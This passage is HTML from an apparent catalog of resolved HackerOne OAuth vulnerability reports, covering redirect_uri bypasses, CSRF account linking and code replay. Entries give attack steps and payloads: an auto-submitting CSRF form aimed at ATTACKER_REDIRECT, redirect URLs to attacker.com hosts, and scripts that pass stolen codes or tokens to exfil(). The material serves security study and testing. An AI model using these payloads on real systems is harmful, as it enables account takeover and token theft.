+<h4>Method</h4><ol><li>POST to /authorization.json with client_id/redirect_uri and no/empty authenticity_token</li><li>Server issues the auth code to attacker's redirect_uri</li><li>Exchange code+client_secret at /authorization/token for an access token</li></ol>
+<div class="pre">&lt;form action="https://launchpad.37signals.com/authorization.json" method="POST"&gt;
+ &lt;input name="client_id" value="ATTACKER_CLIENT_ID"&gt;
+ &lt;input name="type" value="web_server"&gt;
+ &lt;input name="redirect_uri" value="ATTACKER_REDIRECT"&gt;
+ &lt;input name="commit" value=""&gt;
+&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Response-format suffixes (.json/.xml) often route to a handler with different (weaker) CSRF enforcement. Try adding .json/.xml to any protected endpoint. Forced OAuth authorization = attacker gains API access without consent.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/850022" target="_blank" rel="noopener">hackerone.com/reports/850022</a></span><a class="src" href="#report-850022" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-131202" style="--sv:var(--sev-high)" data-sev="3" data-votes="31" data-bounty="840">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token theft via wildcard redirect_uri + open redirect</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#131202</b> · x · USD 840 · 31 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>Open redirect + wildcard redirect_uri + %2523 -&gt; steal ac</b></span><span>Tag <b>oauth</b></span><span>Tag <b>open-redirect</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth app registered a wildcard redirect_uri (http(s)://*.twitter.com/*); an open redirect on an allowed subdomain, plus a double-encoded fragment (%2523 -&gt; %23 -&gt; #), forwarded the access_token in location.hash to an attacker-controlled destination.</p>
+<h4>Method</h4><ol><li>Find an open redirect on an in-scope subdomain (cards.twitter.com/.../yyms -&gt; external)</li><li>Append %2523 so the provider decodes it to # and appends the token as a fragment</li><li>Use this as the OAuth redirect_uri; it matches the *.twitter.com/* wildcard</li><li>Victim (already authorized) clicks once; token lands in the fragment and is read via location.hash</li></ol>
+<div class="pre">redirect_uri=https://cards.twitter.com/cards/18ce53y6aap/yyms%2523
+// attacker page: token = location.hash</div>
+<p class="insight"><b>Insight —</b> Wildcard/loose redirect_uri + any open redirect on an allowed host = token exfiltration. Chase double/triple URL-encoding of # (%23/%2523) to smuggle the fragment past the redirector.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/131202" target="_blank" rel="noopener">hackerone.com/reports/131202</a></span><a class="src" href="#report-131202" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-770548" style="--sv:var(--sev-high)" data-sev="3" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unvalidated OAuth redirect parameter leaks auth code -&gt; account takeover</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#770548</b> · 8x8-bounty · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>8x8-bounty</b></span><span>Surface <b>web</b></span><span>Chain <b>open redirect in OAuth -&gt; auth code leak -&gt; admin SSO </b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The admin app's OAuth flow used a successRedirectUrl parameter that accepted any domain, so the returned authorization code was delivered to an attacker-controlled host, which could then exchange/replay it to log in as the victim.</p>
+<h4>Method</h4><ol><li>Start the admin add-account OAuth (Google) flow</li><li>Set successRedirectUrl to an attacker domain</li><li>Victim completes auth; the code lands on the attacker host</li><li>Attacker uses the leaked code to authenticate as the victim admin</li></ol>
+<div class="pre">...oauth?...&amp;successRedirectUrl=https://attacker.tld/   # code/token sent to arbitrary domain</div>
+<p class="insight"><b>Insight —</b> Always test redirect_uri / return / success-url params in OAuth/SSO for open-redirect; if the auth code or token rides that redirect, an unvalidated value is a full account takeover, not just a redirect.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/770548" target="_blank" rel="noopener">hackerone.com/reports/770548</a></span><a class="src" href="#report-770548" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-225653" style="--sv:var(--sev-high)" data-sev="3" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth/OpenID account-linking CSRF -&gt; attacker links their identity to victim</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#225653</b> · weblate · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>weblate</b></span><span>Surface <b>web</b></span><span>Chain <b>account-linking CSRF -&gt; login as victim via attacker's Id</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The social-login 'add association / complete' callback is not CSRF-protected, so an attacker can replay their own IdP assertion into the victim's session, binding the attacker's third-party account to the victim's app account. Attacker then logs in via that IdP as the victim.</p>
+<h4>Method</h4><ol><li>As attacker, start 'Add new association' with an IdP (Ubuntu One/OpenID) and intercept the /accounts/complete/&lt;provider&gt;/ callback POST that carries the signed assertion.</li><li>Drop the request in your own flow; rebuild it as an auto-submit CSRF form.</li><li>Deliver to a logged-in victim; the attacker's IdP identity is now associated with the victim account.</li><li>Attacker uses 'Login with &lt;IdP&gt;' to access the victim's account.</li></ol>
+<div class="pre">CSRF form POSTing the captured `openid.*` assertion params to:
+https://TARGET/accounts/complete/ubuntu/?janrain_nonce=...  (all openid.sig/openid.claimed_id/openid.identity fields as hidden inputs)</div>
+<p class="insight"><b>Insight —</b> Social-login 'connect account' endpoints are a high-value CSRF target: linking (not just settings) leads straight to ATO. Verify the completion/callback carries and enforces a state/nonce bound to the user's session; if you can replay your own assertion cross-site, it's ATO.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/225653" target="_blank" rel="noopener">hackerone.com/reports/225653</a></span><a class="src" href="#report-225653" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-48065" style="--sv:var(--sev-high)" data-sev="3" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth redirect_uri without scheme concatenated to base host</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#48065</b> · coinbase · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>coinbase</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OAuth authorize accepted a redirect_uri lacking an http(s) scheme; the server concatenated it to the base, producing www.coinbase.com&lt;attacker&gt; and redirecting the user (with the auth code) to an attacker-controlled destination.</p>
+<h4>Method</h4><ol><li>Register/craft an OAuth authorize request with redirect_uri missing its scheme (e.g. attacker.tld/code.php)</li><li>Send victim the authorize URL</li><li>Victim is redirected to www.coinbase.com+attacker string / attacker host, leaking the code/token</li></ol>
+<div class="pre">https://www.coinbase.com/oauth/authorize?response_type=code&amp;client_id=CLIENT&amp;redirect_uri=attacker.tld/code.php&amp;scope=user</div>
+<p class="insight"><b>Insight —</b> Test OAuth redirect_uri validation with scheme-less values, trailing/leading dots, and prefix tricks; string-concat or prefix-match validation leaks the authorization code.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/48065" target="_blank" rel="noopener">hackerone.com/reports/48065</a></span><a class="src" href="#report-48065" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-861940" style="--sv:var(--sev-med)" data-sev="2" data-votes="263" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth redirect_uri bypass via IDN homograph domain</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#861940</b> · semrush · awarded · 263 votes · resolved</div>
+<div class="taxo"><span>Program <b>semrush</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OAuth redirect_uri validation treated Unicode look-alike domains (Cyrillic e in the host) as the legitimate host, so the authorization code was delivered to an attacker-registered punycode domain.</p>
+<h4>Method</h4><ol><li>Find the OAuth authorize endpoint and its redirect_uri validation</li><li>Craft a homograph of the allowed host using look-alike Unicode chars</li><li>Register the punycode equivalent (xn--...) and use it as redirect_uri</li><li>Victim approves; code/token is sent to attacker domain</li></ol>
+<div class="pre">https://oauth.semrush.com/oauth2/authorize?response_type=code&amp;client_id=seoquake&amp;redirect_uri=https://oauth.&lt;homograph&gt;.com/oauth2/success
+# homograph host == xn--emrush-9jb.com</div>
+<p class="insight"><b>Insight —</b> redirect_uri allowlists that compare decoded Unicode (not punycode/exact bytes) are bypassable with homograph domains. Test IDN look-alikes against any host-based redirect/CORS/email validation.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/861940" target="_blank" rel="noopener">hackerone.com/reports/861940</a></span><a class="src" href="#report-861940" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-3423013" style="--sv:var(--sev-high)" data-sev="3" data-votes="43" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Open redirect in OAuth flow leaks authorization code -&gt; token/ATO</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#3423013</b> · line · 1000 · 43 votes · resolved</div>
+<div class="taxo"><span>Program <b>line</b></span><span>Surface <b>web</b></span><span>Chain <b>open redirect on OAuth host -&gt; auth code sent to attacker</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An open redirect on an OAuth-participating host let the authorization response (code) be delivered to an attacker-controlled endpoint, because redirect destinations were not restricted to trusted domains within the OAuth 2.0 flow.</p>
+<h4>Method</h4><ol><li>Find an open redirect on a host used inside the OAuth authorize/return flow</li><li>Craft the authorize/return URL so the code is forwarded to the attacker via the redirect</li><li>Victim authenticates; code lands at attacker; exchange for access token</li></ol>
+<p class="insight"><b>Insight —</b> Chain any open redirect that sits on the OAuth redirect_uri path (or an intermediate return_to) into authorization-code exfiltration. Always test whether the OAuth return/redirect handler will forward the code to an off-host location; a low-sev open redirect becomes account takeover.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3423013" target="_blank" rel="noopener">hackerone.com/reports/3423013</a></span><a class="src" href="#report-3423013" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-110467" style="--sv:var(--sev-med)" data-sev="2" data-votes="92" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth bridge: embedding-origin not validated (postMessage proxy)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#110467</b> · x · awarded · 92 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>credential leak -&gt; login to victim account on any Digits-</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Digits getLoginStatus uses a hidden /bridge iframe that validates the host param against the app's registered domain but never checks that the PAGE embedding the bridge is that domain; an attacker page embeds the legit bridge URL and receives the OAuth credential via postMessage.</p>
+<h4>Method</h4><ol><li>Take a legit app's bridge URL /bridge?consumer_key=&lt;key&gt;&amp;host=https://legit.app</li><li>Embed it in attacker.com and invoke getLoginStatus</li><li>Bridge AJAX /login_status returns victim OAuth creds, postMessage'd to attacker parent</li><li>No user interaction if victim already authorized the app</li></ol>
+<div class="pre">&lt;iframe src="https://www.digits.com/bridge?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&amp;host=https://www.periscope.tv"&gt;&lt;/iframe&gt;
+&lt;script&gt;window.addEventListener('message',e=&gt;exfil(e.data))&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> For any postMessage/iframe SSO bridge: it may validate a claimed origin PARAMETER but not the real embedding origin. Host the legit bridge URL on your page and listen for the credential message.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/110467" target="_blank" rel="noopener">hackerone.com/reports/110467</a></span><a class="src" href="#report-110467" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-3713965" style="--sv:var(--sev-med)" data-sev="2" data-votes="90" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth consent screen omits a sensitive scope (UI misrepresentation)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3713965</b> · github · awarded · 90 votes · resolved</div>
+<div class="taxo"><span>Program <b>github</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth authorization consent screen failed to display a requested scope (manage_runners:org), so a victim who approves the app unknowingly grants more access than shown.</p>
+<h4>Method</h4><ol><li>Register an OAuth app requesting an over-broad/sensitive scope (e.g. manage_runners:org)</li><li>Direct a victim to the authorize URL</li><li>Observe the consent screen does not list that scope, so the victim under-estimates the grant and authorizes</li><li>App now holds the hidden scope's privileges</li></ol>
+<div class="pre">GET /login/oauth/authorize?client_id=&lt;attacker_app&gt;&amp;scope=manage_runners:org&amp;redirect_uri=&lt;attacker&gt;
+# consent screen fails to render the manage_runners:org scope -&gt; victim grants it unknowingly</div>
+<p class="insight"><b>Insight —</b> Audit OAuth consent screens for scope-display gaps: request each sensitive/newer scope and check it is actually shown before approval. Missing scopes on the consent UI let an app silently acquire privileges the user never saw. (CVE-2026-9106.)</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3713965" target="_blank" rel="noopener">hackerone.com/reports/3713965</a></span><a class="src" href="#report-3713965" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-101977" style="--sv:var(--sev-med)" data-sev="2" data-votes="76" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Social login accepts access_token from any app (no app-id check)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#101977</b> · imgur · none · 76 votes · resolved</div>
+<div class="taxo"><span>Program <b>imgur</b></span><span>Surface <b>api</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Facebook-login endpoint exchanges any valid Facebook access_token for an Imgur session without verifying the token was issued to Imgur's app id; an attacker's own FB app can obtain a victim's token and log in as them.</p>
+<h4>Method</h4><ol><li>Build your own Facebook app</li><li>Get the victim's FB access_token via your app</li><li>POST it to imgur's /generatetoken/thirdpartynativeandroid?type=facebook as access_token</li><li>Imgur logs you in as the victim (fix: check token app id == 127621437303857)</li></ol>
+<div class="pre">POST https://api.imgur.com/generatetoken/thirdpartynativeandroid?type=facebook
+access_token=&lt;token_issued_to_attacker_FB_app&gt;</div>
+<p class="insight"><b>Insight —</b> Provider access_token != identity proof. If a site accepts a raw FB/Google access_token, verify it validates the token's audience/app-id (debug_token). Otherwise a token from a different app is accepted = ATO. Classic 'confused deputy'.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/101977" target="_blank" rel="noopener">hackerone.com/reports/101977</a></span><a class="src" href="#report-101977" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-151058" style="--sv:var(--sev-med)" data-sev="2" data-votes="71" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Wildcard OAuth redirect_uri leaks SSO token</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#151058</b> · shopify · awarded · 71 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>token leak -&gt; chat as victim + email/name disclosure</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The livechat SSO flow accepts any *.myshopify.com / *.shopify.com as return_to (redirect_uri); an attacker-controlled shop receives the auth_code in the URL and uses it to log into livechat as the victim and read PII.</p>
+<h4>Method</h4><ol><li>Craft the SSO auth URL with return_to=https://&lt;attacker_shop&gt;.myshopify.com/ and shop=&lt;victim_shop&gt;</li><li>Send to victim; on approval they're redirected to attacker shop with ?auth_code=&lt;token&gt;</li><li>Attacker JS on the shop reads the code from location.search</li><li>Attacker opens livechat.shopify.com/customer/chats/new?auth_code=&lt;token&gt; -&gt; logged in as victim, PII in page source</li></ol>
+<div class="pre">https://tasker-merchant-auth.herokuapp.com/auth/shopify/?auth_type=chat&amp;return_to=https://ATTACKER.myshopify.com/&amp;shop=VICTIM.myshopify.com
+&lt;script&gt;var t=location.search.match(/auth_code=([^&amp;]+)/);exfil(t[1])&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Whenever redirect_uri/return_to validation is a wildcard subdomain match and the subdomain is attacker-controllable (myshopify.com shops, tenant subdomains), the token is deliverable to you. Check redirect_uri host allow-listing precisely.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/151058" target="_blank" rel="noopener">hackerone.com/reports/151058</a></span><a class="src" href="#report-151058" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-405100" style="--sv:var(--sev-med)" data-sev="2" data-votes="44" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth redirect_uri whitelist bypass via prefix-only match</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#405100</b> · bohemia · none · 44 votes · resolved</div>
+<div class="taxo"><span>Program <b>bohemia</b></span><span>Surface <b>web</b></span><span>Chain <b>redirect_uri bypass -&gt; steal authorization code -&gt; acc</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Authorization server validates redirect_uri by checking only that it starts with the allowed origin, not the full host. Appending characters after the allowed prefix (xbox.dayz.com -&gt; xbox.dayz.comEVIL.com) passes the check and redirects the code+state to an attacker-registrable domain.</p>
+<h4>Method</h4><ol><li>Find the OAuth authorize request and its whitelisted redirect_uri (e.g. https://xbox.dayz.com/...).</li><li>Craft redirect_uri that keeps the prefix but changes the real host: https://xbox.dayz.comtest.com/api/auth/callback.</li><li>Register that domain; when a logged-in victim opens the authorize URL, the code+state land on your host -&gt; exchange for tokens/ATO.</li></ol>
+<div class="pre">GET /api/auth?response_type=code&amp;redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&amp;state=STATE&amp;client_id=CLIENT HTTP/1.1
+Host: accounts.bistudio.com</div>
+<p class="insight"><b>Insight —</b> Test redirect_uri validators with: suffix append (allowed.com.evil.com), path append, subdomain (allowed.evil.com), @ trick, encoded chars, and open-redirect chaining. Prefix/startswith matching is the classic broken check.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/405100" target="_blank" rel="noopener">hackerone.com/reports/405100</a></span><a class="src" href="#report-405100" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-3734676" style="--sv:var(--sev-med)" data-sev="2" data-votes="32" data-bounty="2000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth2 authorization-code replay + wrong expiry column</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3734676</b> · mozilla · USD 2000 · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>mozilla</b></span><span>Surface <b>api</b></span><span>Chain <b>Leaked auth code -&gt; replay token exchange -&gt; bridge to</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The token-exchange handler never consumed (deleted) the authorization_codes row and checked entry.client_details.expires (the credential lifetime, up to 1 year) instead of the code row's entry.expires (10 min), so a captured code could be replayed for hours to mint fresh bridge tokens.</p>
+<h4>Method</h4><ol><li>Capture an authorization code (redirect-page logs, referer, TLS-inspecting proxy, browser history)</li><li>POST /login/oauth/token with the code -&gt; token A (200)</li><li>Replay the same code -&gt; token B (200), proving single-use is not enforced</li><li>Call GET /login/oauth/credentials with the bridge token to mint Taskcluster credentials in the victim's identity</li></ol>
+<div class="pre">POST /login/oauth/token   {code, redirect_uri}   # replayable, code never deleted
+GET  /login/oauth/credentials  Authorization: Bearer &lt;bridge token&gt;</div>
+<p class="insight"><b>Insight —</b> Verify OAuth codes are single-use (replay the same code twice) and that the expiry check reads the code's own lifetime column, not the resulting credential's. Atomic DELETE...RETURNING WHERE expires&gt;now() is the correct gate.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3734676" target="_blank" rel="noopener">hackerone.com/reports/3734676</a></span><a class="src" href="#report-3734676" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-140432" style="--sv:var(--sev-med)" data-sev="2" data-votes="17" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth access-token theft via loose redirect_uri</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#140432</b> · gratipay · USD 10 · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Facebook OAuth client accepts any same-site redirect_uri (no fixed /callback allowlist); pointing it at an attacker-controlled user profile page leaks the token/code via Referer and third-party image loads.</p>
+<h4>Method</h4><ol><li>Craft an authorize URL with redirect_uri set to your own profile page (e.g. https://site/~attacker/)</li><li>Victim who follows it lands on your page with token/code in URL</li><li>Token leaks outbound via Referer header and off-site img src on that page</li></ol>
+<div class="pre">https://www.facebook.com/dialog/oauth?response_type=code&amp;client_id=&lt;ID&gt;&amp;redirect_uri=https://gratipay.com/~attacker/&amp;scope=email&amp;state=...</div>
+<p class="insight"><b>Insight —</b> If redirect_uri isn't pinned to a dedicated path, any page you control on the same origin becomes an exfiltration point; hunt for user-content pages that echo the URL or load external resources.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/140432" target="_blank" rel="noopener">hackerone.com/reports/140432</a></span><a class="src" href="#report-140432" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-316078" style="--sv:var(--sev-med)" data-sev="2" data-votes="11" data-bounty="300">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth grant_access hashes with no expiry or account-state binding enable 2FA replay</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#316078</b> · vkcom · USD 300 · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>vkcom</b></span><span>Surface <b>web</b></span><span>Chain <b>One-time session access -&gt; capture grant hash -&gt; persi</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The hashes used on login.vk.com/?act=grant_access had no expiration and were not bound to meaningful account state (whether 2FA is enabled, when sessions were last reset). Having accessed the account once, an attacker could reuse a captured grant hash later to obtain an access_token and bypass 2FA.</p>
+<h4>Method</h4><ol><li>Capture the grant_access hash while having access to the victim session once</li><li>Later, replay the hash against login.vk.com/?act=grant_access</li><li>Because it never expired and is not invalidated by 2FA enablement or session reset, it still yields access_token / bypasses 2FA</li></ol>
+<div class="pre">https://login.vk.com/?act=grant_access&amp;...&amp;hash=&lt;captured, non-expiring hash&gt;</div>
+<p class="insight"><b>Insight —</b> Audit any authorization/grant hash or token for two properties: expiry, and invalidation on security-relevant state changes (2FA toggled, password reset, sessions revoked). A grant artifact that survives those events becomes a permanent bypass of the very controls the user enabled afterward.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/316078" target="_blank" rel="noopener">hackerone.com/reports/316078</a></span><a class="src" href="#report-316078" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-3930" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token/code theft via open redirect on a trusted OAuth server</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3930</b> · phabricator · awarded · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>phabricator</b></span><span>Surface <b>web</b></span><span>Chain <b>provider authorize (response_type=token) -&gt; whitelisted R</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The provider (Facebook/Disqus/Twitter) redirects the access_token/code to a redirect_uri on a trusted relying party. Because that relying party's own oauthserver/auth (or an attacker-set custom domain / requestTokenAndRedirect) is an open redirect, the token is bounced onward to the attacker host - all in one click.</p>
+<h4>Method</h4><ol><li>Find an open redirect on a domain that is a whitelisted redirect_uri of an OAuth provider (the RP's oauth callback/redirector).</li><li>Build a provider authorize URL with response_type=token (or code) and redirect_uri set to the RP open-redirect that forwards to your server.</li><li>Victim clicks; provider issues the token to the RP, the RP's redirect bounces it (in URL fragment/query) to the attacker.</li></ol>
+<div class="pre">https://www.facebook.com/dialog/oauth?client_id=CID&amp;response_type=token&amp;redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://attacker.com%26response_type=code%26client_id=RP_CID%26scope=ggg</div>
+<p class="insight"><b>Insight —</b> An open redirect on a domain that is a registered OAuth redirect_uri is not low severity - it upgrades to full token/code theft (account takeover) because the provider hands the token to that trusted host, which then leaks it onward. Also achievable by setting the RP redirect target to a custom domain you control (3596) or a token+verifier leak on Twitter OAuth (7900).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3930" target="_blank" rel="noopener">hackerone.com/reports/3930</a></span><a class="src" href="#report-3930" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-99435" style="--sv:var(--sev-med)" data-sev="2" data-votes="9" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Browser URL-parsing quirk bypass to exfiltrate OAuth access_token (IE/Edge)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#99435</b> · bumble · awarded · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>bumble</b></span><span>Surface <b>web</b></span><span>Chain <b>FB authorize (response_type=token) -&gt; host-check bypass v</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The redirector accepts a base64 state URL and blocks obvious external hosts, but IE 11/Edge parse http://google.com%2f.badoo.com/ as host badoo.com (path google.com), so the server-side host check passes while the browser navigates elsewhere. Because Facebook forwards the access_token to redirect_uri even with a query string, the token leaks to the attacker-parsed host.</p>
+<h4>Method</h4><ol><li>Base64-encode a URL of the form http://ATTACKER%2f.TRUSTED.com/ into the state param.</li><li>Load the FB authorize URL with redirect_uri pointing at the trusted redirector carrying that state.</li><li>In IE/Edge the victim lands on ATTACKER with #access_token=... in the fragment.</li></ol>
+<div class="pre">https://www.facebook.com/v2.2/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=CID&amp;redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3d&lt;base64 of http://www.google.com%2f.badoo.com/&gt;
+# lands: https://www.google.com/.badoo.com/#access_token=...</div>
+<p class="insight"><b>Insight —</b> Host-allowlist checks that assume one canonical parse are bypassable with browser-specific URL quirks (%2f, backslashes, userinfo). Combine an OAuth flow that forwards tokens with such a quirk to turn a filtered redirect into token theft. Test target browsers explicitly - this only fired on IE11/Edge.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/99435" target="_blank" rel="noopener">hackerone.com/reports/99435</a></span><a class="src" href="#report-99435" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-46485" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="1260">
